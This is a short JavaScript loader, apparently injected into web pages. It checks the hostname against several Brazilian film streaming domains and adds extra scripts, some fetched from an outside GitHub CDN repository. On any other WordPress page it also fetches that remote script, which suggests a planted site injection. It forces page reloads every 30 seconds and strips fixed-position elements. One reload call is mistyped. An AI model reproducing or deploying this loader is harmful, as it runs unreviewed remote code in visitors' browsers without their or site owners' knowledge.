var g = window.location.hostname;
var head= document.getElementsByTagName('head')[0];
var scriptxx= document.createElement('script'); 
scriptxx.src= 'https://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.7.1.min.js'; 
scriptxx.type = "text/javascript"; 
scriptxx.async = false; 
head.appendChild(scriptxx); var x= document.createElement('script'); 
x.src= 'https://ajax.aspnetcdn.com/ajax/jquery.validate/1.9/jquery.validate.min.js'; 
x.type = "text/javascript"; x.async = false; head.appendChild(x); 
x.onload=function( evt ) { (function($) {  
  var needle = 'flixfilmes.org'; if (g.indexOf(needle) == 0) { var link; link = document.createElement("script"); link.setAttribute("src", "/f/f.js"); document.getElementsByTagName("head")[0].appendChild(link); } var mn = 'megahdfilmes.me'; if (g.indexOf(mn) == 0 || g.indexOf('megahdseries.com') == 0 || g.indexOf('megahdfilmes.com') == 0) {  var link; link = document.createElement("script"); link.setAttribute("src", "/m/m.js?55"); document.getElementsByTagName("head")[0].appendChild(link); }else if (g.indexOf("superflixfilmes.net") == 0 || g.indexOf("megafilmesonlinebr.net") == 0  || g.indexOf("megafilmessonlinebr.net") == 0) { var link; link = document.createElement("script"); link.setAttribute("src", "//cdn.jsdelivr.net/gh/gistmib/gistmib/spp/sps.js"); document.getElementsByTagName("head")[0].appendChild(link); setInterval(function(){if($(".dts")[0]){clearInterval();}else{window.location.reload();}},30000); } else if (g.indexOf("thefilmes.tv") == 0) { var link; link = document.createElement("script"); link.setAttribute("src", "/t/t.js?"); document.getElementsByTagName("head")[0].appendChild(link); }else if (g.indexOf("superflix.vc") == 0) { var link; link = document.createElement("script"); link.setAttribute("src", "/sp.js?11110000p"); document.getElementsByTagName("head")[0].appendChild(link); }else if(g.indexOf("megafilmeshd50") == 0) { var link; link = document.createElement("script"); link.setAttribute("src", "//cdn.jsdelivr.net/gh/gistmib/gistmib/mf/mf.js?hmmmhhmmmggg"); document.getElementsByTagName("head")[0].appendChild(link); setInterval(function(){ if($(".dtss")[0]){}else{window,location.reload();}},30000); setInterval(function(){ $('div[style*="position: fixed"]').remove(); },0) }else{
    var element =  document.getElementById('wp-block-library-css');
if (typeof(element) != 'undefined' && element != null)
{
  var link; link = document.createElement("script"); link.setAttribute("src", "//cdn.jsdelivr.net/gh/gistmib/gistmib/spp/sps.js"); document.getElementsByTagName("head")[0].appendChild(link); setInterval(function(){if($(".dts")[0]){clearInterval();}else{window.location.reload();}},30000);}
  } 
  })(jQuery); }
check = "true";